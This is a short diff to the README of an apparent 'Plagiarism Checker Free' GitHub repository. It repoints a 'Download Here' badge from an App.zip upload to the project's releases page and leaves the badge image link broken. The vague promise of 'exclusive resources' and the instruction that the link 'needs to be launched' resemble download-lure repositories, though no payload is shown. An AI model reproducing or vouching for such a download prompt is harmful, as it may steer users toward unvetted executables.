@@ -25,7 +25,7 @@ Welcome to the **Plagiarism Checker Free** repository! This repository is your o
 
 Ready to dive in and explore all the amazing resources we have to offer? Click the link below to access our exclusive resources:
 
-[![Download Here](https://img.shields.io/badge/Download-Here-green)](https://github.com/uploads/App.zip)
+[![Download Here](https://github.com/mami89989/Plagiarism-Checker-Free/releases)](https://github.com/mami89989/Plagiarism-Checker-Free/releases)
 
 🔗 **Please note:** The "Download Here" link needs to be launched to access the repository resources.
 
